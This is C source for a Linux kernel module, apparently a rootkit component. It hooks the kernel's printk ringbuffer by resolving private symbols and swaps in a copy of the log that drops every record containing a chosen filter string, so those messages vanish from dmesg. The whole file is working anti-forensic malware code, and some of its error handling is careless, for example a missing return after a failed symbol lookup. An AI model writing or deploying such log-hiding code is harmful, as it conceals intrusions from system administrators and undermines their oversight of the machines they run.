#include <linux/init.h>
#include <linux/module.h>
#include "include/filter_dmesg.h"
#include "include/util.h"

#define prb_for_each_record(from, rb, s, r) \
for ((s) = from; prb_read_valid(rb, s, r); (s) = (r)->info->seq + 1)

static struct printk_ringbuffer *clean_rb;
static char *text_buffer;
static struct prb_desc *descriptors;
static struct printk_info *infos;

#define PRINTK_INFO_SUBSYSTEM_LEN	16
#define PRINTK_INFO_DEVICE_LEN		48

struct dev_printk_info {
	char subsystem[PRINTK_INFO_SUBSYSTEM_LEN];
	char device[PRINTK_INFO_DEVICE_LEN];
};

struct printk_info {
	u64	seq;		/* sequence number */
	u64	ts_nsec;	/* timestamp in nanoseconds */
	u16	text_len;	/* length of text message */
	u8	facility;	/* syslog facility */
	u8	flags:5;	/* internal record flags */
	u8	level:3;	/* syslog level */
	u32	caller_id;	/* thread id or processor id */

	struct dev_printk_info	dev_info;
};

/* Specifies the logical position and span of a data block. */
struct prb_data_blk_lpos {
	unsigned long	begin;
	unsigned long	next;
};

/*
 * A descriptor: the complete meta-data for a record.
 *
 * @state_var: A bitwise combination of descriptor ID and descriptor state.
 */
struct prb_desc {
	atomic_long_t			state_var;
	struct prb_data_blk_lpos	text_blk_lpos;
};

/* A ringbuffer of "ID + data" elements. */
struct prb_data_ring {
	unsigned int	size_bits;
	char		*data;
	atomic_long_t	head_lpos;
	atomic_long_t	tail_lpos;
};

/* A ringbuffer of "struct prb_desc" elements. */
struct prb_desc_ring {
	unsigned int		count_bits;
	struct prb_desc		*descs;
	struct printk_info	*infos;
	atomic_long_t		head_id;
	atomic_long_t		tail_id;
	atomic_long_t		last_finalized_id;
};

/*
 * The high level structure representing the printk ringbuffer.
 *
 * @fail: Count of failed prb_reserve() calls where not even a data-less
 *        record was created.
 */
struct printk_ringbuffer {
	struct prb_desc_ring	desc_ring;
	struct prb_data_ring	text_data_ring;
	atomic_long_t		fail;
};

struct printk_record {
	struct printk_info	*info;
	char			*text_buf;
	unsigned int		text_buf_size;
};

struct prb_reserved_entry {
	struct printk_ringbuffer	*rb;
	unsigned long			irqflags;
	unsigned long			id;
	unsigned int			text_space;
};

typedef void (*prb_init_fn)(struct printk_ringbuffer *rb,
                            char *text_buf,
                            unsigned int text_buf_size,
                            struct prb_desc *descs,
                            unsigned int descs_count_bits,
                            struct printk_info *infos);


typedef u64 (*prb_first_valid_seq_fn)(struct printk_ringbuffer *rb);

typedef bool (*prb_read_valid_fn)(struct printk_ringbuffer *rb,
                                  u64 seq,
                                  struct printk_record *r);


typedef bool (*prb_reserve_fn)(struct prb_reserved_entry *e, struct printk_ringbuffer *rb,
		 struct printk_record *r);

typedef void (*prb_final_commit_fn)(struct prb_reserved_entry *e);

static int initialize_ringbuffer(void);
static void iterate_ringbuffer(struct printk_ringbuffer *rb);
static void add_to_rb(struct printk_ringbuffer *rb, struct printk_record *r);

static prb_init_fn prb_init;
static prb_first_valid_seq_fn prb_first_valid_seq;
static prb_read_valid_fn prb_read_valid;
static prb_reserve_fn prb_reserve;
static prb_final_commit_fn prb_final_commit;



static inline void prb_rec_init_rd(struct printk_record *r,
				   struct printk_info *info,
				   char *text_buf, unsigned int text_buf_size)
{
	r->info = info;
	r->text_buf = text_buf;
	r->text_buf_size = text_buf_size;
}

static inline void prb_rec_init_wr(struct printk_record *r,
				   unsigned int text_buf_size)
{
	r->info = NULL;
	r->text_buf = NULL;
	r->text_buf_size = text_buf_size;
}


static void add_to_rb(struct printk_ringbuffer *rb,
				     struct printk_record *r)
{
	struct prb_reserved_entry e;
	struct printk_record dest_r;

	prb_rec_init_wr(&dest_r, r->info->text_len);

	if (!prb_reserve(&e, rb, &dest_r))
		return;

	memcpy(&dest_r.text_buf[0], &r->text_buf[0], r->info->text_len);
	dest_r.info->text_len = r->info->text_len;
	dest_r.info->facility = r->info->facility;
	dest_r.info->level = r->info->level;
	dest_r.info->flags = r->info->flags;
	dest_r.info->ts_nsec = r->info->ts_nsec;
	dest_r.info->caller_id = r->info->caller_id;
	memcpy(&dest_r.info->dev_info, &r->info->dev_info, sizeof(dest_r.info->dev_info));

	prb_final_commit(&e);

	return;
}


static void iterate_ringbuffer(struct printk_ringbuffer *rb)
{
    struct printk_info info;
    struct printk_record rec;
    char text_buf[1024];
    u64 seq;
    
    prb_rec_init_rd(&rec, &info, text_buf, sizeof(text_buf));
    
    prb_for_each_record(0, rb, seq, &rec) {
        if (rec.text_buf_size > 0 && strstr(rec.text_buf, FILTER_STR) == NULL) {
		    add_to_rb(clean_rb, &rec);
        }
	}
}

static int initialize_ringbuffer(void)
{
    // these are kinda random
    size_t text_size = 1024*1024;
    size_t desc_count = 1024;
    
    clean_rb = kzalloc(sizeof(struct printk_ringbuffer), GFP_KERNEL);
    if (!clean_rb)
        return -ENOMEM;
    
    text_buffer = kzalloc(text_size, GFP_KERNEL);
    if (!text_buffer)
        goto free_rb;
    
    descriptors = kzalloc(desc_count * sizeof(struct prb_desc), GFP_KERNEL);
    if (!descriptors)
        goto free_text;
    
    infos = kzalloc(desc_count * sizeof(struct printk_info), GFP_KERNEL);
    if (!infos)
        goto free_desc;

    prb_init(clean_rb,
             text_buffer, ilog2(text_size),
             descriptors, ilog2(desc_count),
             infos);
    
    return 0;

free_desc:
    kfree(descriptors);
free_text:
    kfree(text_buffer);
free_rb:
    kfree(clean_rb);
    return -ENOMEM;
}

int filter_dmesg()
{
    struct printk_ringbuffer **prb_p =
        (struct printk_ringbuffer **) resolve_sym("prb");

    struct printk_ringbuffer *prb, *old_prb = NULL;
    if (prb_p == NULL) {
        printk("unable to find prb\n");
    }
    prb = *prb_p;
    old_prb = prb;

    prb_init = (prb_init_fn)resolve_sym("prb_init");

    prb_first_valid_seq =
        (prb_first_valid_seq_fn) resolve_sym("prb_first_valid_seq");
    prb_read_valid =
        (prb_read_valid_fn) resolve_sym("prb_read_valid");
    prb_reserve =
        (prb_reserve_fn) resolve_sym("prb_reserve");
    prb_final_commit =
        (prb_final_commit_fn) resolve_sym("prb_final_commit");

    if (is_unresolved_sym())
        return -1;

    initialize_ringbuffer();
    *prb_p = clean_rb;
    iterate_ringbuffer(prb);
    return 0;
}
